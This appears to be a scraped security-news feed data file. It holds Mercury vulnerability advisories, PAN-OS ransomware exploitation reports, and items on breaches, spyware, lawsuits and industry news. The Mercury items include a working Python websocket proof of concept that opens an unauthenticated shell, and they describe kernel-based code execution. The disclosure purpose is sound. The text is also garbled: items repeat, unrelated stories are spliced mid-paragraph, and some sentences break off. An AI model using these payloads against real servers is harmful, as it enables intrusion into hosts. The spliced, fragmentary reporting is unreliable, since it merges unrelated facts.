items.detail:
Vulnérabilité critique CVE-2026-111057 affectant mercury (pip) (score CVSS 10).

Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass

BLOCKED_PATTERNS = [ # JupyterLab UI + API r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?" r"/api/terminals(?:/.*)?", r"/api/shutdown(?:/.*)?", r"/files(?:/.*)?", ] The missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:

/lab...(?:/. * )?/api/terminals(?:/. * )? (the first two lines joined together) /api/shutdown(?:/. * )? /files(?:/. * )?

A direct request to /api/terminals does not match any of the 3 blocklist rules and is therefore not blocked , reaching Jupyter Server's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.

Testing was performed on a local Docker deployment ( https://runmercury.com/deploy/dockerfile/ ), Mercury version 3.2.3, default configuration.

python3 -c " import websocket, json, time ws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1') print(ws.recv()) ws.send(json.dumps(['stdin', 'whoami && id\n'])) time.sleep(1) ws.settimeout(2) try: while True: print(ws.recv()) except Exception: pass " Observed output:

Exploitable by any network client that can reach the Mercury server, including the public internet if it is deployed without additional access controls (VPN, reverse-proxy authentication, firewall).

items.title: CVE-2026-111058 — Mercury: Unauthenticated Remote Code Execution via /api/kernels
items.body:
Vulnérabilité critique CVE-2026-111058 affectant mercury (pip) (score CVSS 9.8).

Mercury: Unauthenticated Remote Code Execution via /api/kernels

/api/kernels is NOT in the blocklist (and cannot be — Mercury needs kernels to run notebooks), and patch_kernel_websocket_handler() ( mercury_app/idle_timeout.py ) only tracks the idle-timeout: it wraps on_message to call self.application._timeout_manager.touch() and then invokes the original handler with no filtering of execute_request .
items.detail:
Vulnérabilité critique CVE-2026-111058 affectant mercury (pip) (score CVSS 9.8).

Mercury: Unauthenticated Remote Code Execution via /api/kernels

/api/kernels is NOT in the blocklist (and cannot be — Mercury needs kernels to run notebooks), and patch_kernel_websocket_handler() ( mercury_app/idle_timeout.py ) only tracks the idle-timeout: it wraps on_message to call self.application._timeout_manager.touch() and then invokes the original handler with no filtering of execute_request . So any unauthenticated network client can:

On mercury 3.2.4 — the release that fixed GHSA-f8c7 — with the default (tokenless) config, as an unauthenticated client: POST /api/terminals returns 403 (the f8c7 fix is present), but POST /api/kernels returns 201 ; opening the kernel websocket and sending an execute_request executed attacker-supplied Python (ran whoami as the server process user and wrote a marker file /tmp/PWNED_MERCURY_RCE ). Full unauthenticated remote code execution. Deterministic PoC (client script + notebook) included.

Unauthenticated, network-reachable arbitrary code execution as the Mercury server process user on every default deployment — complete compromise of the host/container and any data/secrets it can reach.

The blocklist cannot secure an anonymous kernel-backed server. Require real per-request authentication (a token or password) by default, or restrict the kernel message channel so anonymous websocket clients cannot issue execute_request outside Mercury's own controlled execution flow.

OSV.dev CLEAN(0) for mercury and mljar-mercury ; the repo's only advisory ( GHSA-f8c7-rwf9-fmgm ) covers /api/terminals only (description does not mention kernels); no issue/PR describes the /api/kernels RCE (#219/#134/#262 are "add auth" feature requests that merely confirm anon

Ransomware operators including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc) are exploiting PAN-OS vulnerability CVE-2026-0257.

October 19 Update: Unit 42 continues to observe attempted exploitation of CVE-2026-0257 by ransomware operators including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc). We’re also aware of public reporting attributing exploitation to threat actors using Settra ransomware.

Palo Alto Networks Unit 42 has observed active exploitation of PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting to access GlobalProtect. This security flaw involves an authentication bypass in the portal and gateway components of vulnerable versions of PAN-OS ® software, which could allow unauthorized attackers to circumvent security controls and initiate virtual private network (VPN) connections. This CVE was added to the Known Exploited Vulnerability (KEV) catalog on May 13, 2026.

No post-access behavior or lateral movement has been identified as of this time. Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events.

We advise organizations to proactively hunt for the indicators of the activity specified in this report and activate incident response protocols for any successful gateway-connected events linked to these indicators. Additionally, we strongly recommend reviewing the security advisory for CVE-2026-0257 , following the available workarounds and mitigations or upgrading to a version that includes a fix for this issue.

items.title: Security patches need patches now that attackers have AI
items.body:
Vulnérabilité critique CVE-2026-21510.

Updating your software only gets you so far. A scary scenario - security fixes themselves being bypassed - is becoming more common, according to AI penetration-testing startup Terra Security, which found a sharp rise in reported patch failures in 2026 after years of relatively low numbers. And no, it’s not a coincidence that AI vulnerability discovery and patching also exploded this year.
items.detail:
Vulnérabilité critique CVE-2026-21510.

Updating your software only gets you so far. A scary scenario - security fixes themselves being bypassed - is becoming more common, according to AI penetration-testing startup Terra Security, which found a sharp rise in reported patch failures in 2026 after years of relatively low numbers. And no, it’s not a coincidence that AI vulnerability discovery and patching also exploded this year. For example, Russian government cyberspies exploited a zero-day Windows Shell security bypass bug, CVE-2026-21510, at least a month before Microsoft patched the flaw in February. Redmond’s patch, however, was incomplete, and left a second flaw - a zero-click authentication coercion vulnerability (CVE-2026-32202) - that was also found and abused before Microsoft fixed it in April. Terra researchers reviewed every published CVE record and GitHub-reviewed advisory looking for broken fixes, and found a distinct pattern. After six years of relatively few patch bypasses, this changed in 2026: “A fix would ship, a bypass would be found, and another fix would go out.” The share of GitHub security fixes that required a follow-up advisory reporting a failed patch within 90 days remained at about 0.2 percent between 2019 and 2025. items.detail:
Incident de sécurité rapporté par The Record.

ConnectWise initially said on Friday that it was investigating “attempts of unauthorized access associated with the ConnectWise Cloud Backup environment,” and confirmed such access on Saturday.

IT management software company ConnectWise shut down several of its services this weekend after Microsoft and other cybersecurity companies warned of a supply chain attack impacting its cloud backup system.

ConnectWise initially said on Friday that it was investigating “attempts of unauthorized access associated with the ConnectWise Cloud Backup environment,” and confirmed such access on Saturday.

Incident responders at cybersecurity firm Huntress said a credential belonging to ConnectWise Cloud Backup was compromised and used to gain access to the customers’ Microsoft 365 environment.

Microsoft confirmed in its own statement that threat actors “likely abused permissions previously granted by customers to the application, including highly elevated permissions like Directory.ReadWrite.All.”

ConnectWise Cloud Backup is a cloud-based backup and recovery service designed to help protect data in Microsoft 365 and Google Workspace. The tool needs broad access to mailboxes, OneDrive, SharePoint, Teams and other data, according to Huntress.

An attacker using stolen ConnectWise Cloud Backup credentials will inherently have wide access to any systems where the app is installed, including places where no trail of evidence will be left.

Incident de sécurité rapporté par The Record.

WhatsApp argued that NSO Group violated a 2025 injunction against using the messaging app to spread spyware. A federal judge said WhatsApp hurt its case by not revealing enough information.

The ruling Friday by Judge Phyllis Hamilton was in response to an appeal WhatsApp filed in June. A phone belonging to the rector of the University of Belgrade was discovered to have been infected with Pegasus spyware, the latest in a series of such discoveries in the lead-up to Serbia's national elections.

Another Serbian opposition leader’s phone was discovered to have been infected with powerful spyware, the latest in a series of such discoveries in the lead-up to national elections next week.

The digital forensics research institute the Citizen Lab confirmed on Monday that University of Belgrade Rector Vladan Đokić’s phone was infected with Pegasus spyware sometime this year. Đokić has been a vocal supporter of a student protest movement calling for the permanent removal from government of Serbia’s former president, Aleksandar Vučić.

Vučić, who left the presidency just weeks ago due to term limits, is running for prime minister in elections to be held on October 25 and is widely expected to wrest back control of the country if reelected to a role he previously held from 2014-2017.

A second suspected victim’s device is still being analyzed by the Citizen Lab. Apple notifications are widely considered high-confidence indicators of commercial spyware targeting.

Second security snafu in two years

Dutch grocery giant Ahold Delhaize, which operates US supermarket chains Food Lion, Giant Food, and Stop & Shop, said it proactively took IT systems offline following a cyberattack, affecting most of its US and European brands.

The multinational chain originally disclosed the incident on October 12.
items.detail:
Incident de sécurité rapporté par The Register.

Second security snafu in two years

Dutch grocery giant Ahold Delhaize, which operates US supermarket chains Food Lion, Giant Food, and Stop & Shop, said it proactively took IT systems offline following a cyberattack, affecting most of its US and European brands.

The multinational chain originally disclosed the incident on October 12. “Ahold Delhaize is experiencing a security issue within its network,” it said at the time, adding that security teams, working to mitigate the issues, took “some” IT systems offline.

On Monday, the company confirmed that it proactively took certain IT systems, including websites and apps, offline, affecting most of its brands, and said that “malicious actions of others” caused the security issue.

“Taking systems offline to help protect them was a precautionary measure that affected most of our brands across Europe and the United States,” Frans Muller, president and CEO of Ahold Delhaize, said in a Monday statement. “The investigation to date confirms this was the right decision.”

At this time, all of the physical stores remain open, and the investigation hasn’t uncovered any evidence to suggest the miscreants stole any “sensitive customer, associate, or partner data,” the disclosure said.

The company last week notified the Dutch National Cyber Security Centre about the digital intruders, and on Monday filed a report with the Dutch police, according to the statement.

Incident de sécurité rapporté par Infosecurity Mag.

The 2024 cyber incident affected the healthcare data of 62 million people, who launched a class action lawsuit against the business services firm

The money will be divided up into covering material losses experienced by individual claimants whose personal data was breached, the costs of credit monitoring and medical data monitoring services for each of the claimants and the plaintiff’s legal fees.

A filing submitted to the US District Court for the District of New Jersey on October 16, 2026 explained that the agreement divides the claimants into two subclasses.

One consists of around 40 million individuals whose stolen data was stored in complex backup files that were not readily accessible to third party actors. The second relates to 22 million individuals who stolen data was stored in files that were readily accessible.

If the settlement receives final approval from the Court, Conduent will no longer be liable for civil claims relating to the cyber incident.

The business services firm has also agreed to strengthen its data security practices as part of the settlement.

The settlement agreement was confirmed by Conduent in an 8-K filing form submitted to the US Securities and Exchange Commission (SEC) on October 16.

items.detail:
Signal de veille — The Record.

The disruptions began Sunday, when users complained of difficulties loading news feeds, playing music and accessing other features of VK's platforms.

Thousands of Russian users reported problems accessing the country's largest social network, VKontakte, and its music streaming service over the weekend following a Ukrainian drone strike on a data center near St. Petersburg.

The disruptions began Sunday, when users complained of difficulties loading news feeds, playing music and accessing other features of VK's platforms.

VK confirmed that its facility in the Leningrad region was targeted in the overnight attack on October 18 but denied that the incident had affected its services, saying they remained available as usual. The company did not disclose the extent of the damage or how many servers were affected.

Independent monitoring services, however, recorded a surge in user complaints and a decline in VK's network connectivity. It was not immediately clear whether the disruptions were caused by the strike.

Outage-tracking website Downdetector received approximately 6,600 reports of problems with VK's services on Sunday, including about 600 within a single hour. Another Russian monitoring service, Sboy , registered roughly 2,100 complaints. Internet monitoring organization NetBlocks reported that connectivity associated with VK had fallen to 56% of normal levels during the incident.

By Monday, the number of complaints had declined, according to Russian monitoring service Detector404 , although users continued to report problems uploading photos and videos, streaming music, logging into their accounts and sending messages.

The Oregon Democrat urged the Cybersecurity and Infrastructure Security Agency and Office of Management and Budget to take steps to adopt Encrypted Client Hello — a cybersecurity technology that protects the name of the website visited by a user — in a letter to the two agencies. items.title: Training AIs to Solve CAPTCHAs
items.body:
Signal de veille — Schneier on Sec..

Interesting research : Abstract : Vision-language models (VLMs) can solve visual CAPTCHAs without task-specific training, but the agents built on them approach every challenge from scratch. For such an agent, the hundredth instance of a familiar puzzle costs as much time and compute as the first. Specialized detectors invert the trade-off, answering in milliseconds but only for categories they were trained on. Neither improves with exposure.
items.detail:
Signal de veille — Schneier on Sec..

Interesting research : Abstract : Vision-language models (VLMs) can solve visual CAPTCHAs without task-specific training, but the agents built on them approach every challenge from scratch. For such an agent, the hundredth instance of a familiar puzzle costs as much time and compute as the first. Specialized detectors invert the trade-off, answering in milliseconds but only for categories they were trained on. Neither improves with exposure. We study what changes when a solver improves with use. Our system pairs a fine-tuned YOLOv8 detector with an open-weight VLM behind a confidence-based router, and runs entirely from screenshots and operating-system input events, with no browser automation or DOM access. It reaches 85.4% overall and 84.2% macro accuracy across 16 classes, exceeding either component alone. Every answer VLM produces also serves as a training label, so the detector absorbs categories it was never trained for, typically after one or two encounters and without human annotation. The same loop also repairs it. A CAPTCHA operator can perturb images against the publicly released detector and drive its accuracy to 0%, but the perturbations leave VLM untouched, and its labels let the detector recover. items.detail:
Signal de veille — Infosecurity Mag.

CyberSN observed a particularly big dip in cybersecurity leadership positions such as CISO and Cybersecurity Director in 2026 compared to 2025

Cybersecurity job postings in the US fell by 26.4% year-over-year from January to September 2026, according to analysis by CyberSN.

A total of 235,786 cybersecurity roles were posted on the job market intelligence platform JobSpikr in 2026. This is the lowest amount of US-based cybersecurity jobs advertised in the four years CyberSN has undertaken its analysis, compared to 273,498 in 2023, 244,911 in 2024 and 320,210 in 2025.

There was a particularly significant drop in leadership roles. CISO postings fell from 4632 in January to September 2025 to 2832 in the same period in 2026, a 38.9% reduction.

Other leadership roles that saw substantial dips included cybersecurity director (a 32.5% fall), cybersecurity lead (41% fall) and cybersecurity manager (24.4% fall).

Overall, nine of the 10 cybersecurity functions tracked by the researchers had fewer postings in 2026 compared to 2025. The only exception was research roles, which grew by 26.1%.

The CyberSN researchers said it is not clear whether the sharp decline in job postings reflects less demand for cybersecurity roles from employers or is simply a return from an unusually strong year in 2025.

items.title: Cloudflare bets you’re overpaying an LLM to read your invoices
items.body:
Signal de veille — Help Net Security.

Cloudflare released a preview of Clairic, an extraction model that pulls typed values out of messy text and images in one pass without generating tokens. In Cloudflare’s test on a damaged-product support claim, a pipeline built around Clairic finished in 19.3 seconds, against 61.7 seconds for a version that used an LLM at every step, and cost 49% less.
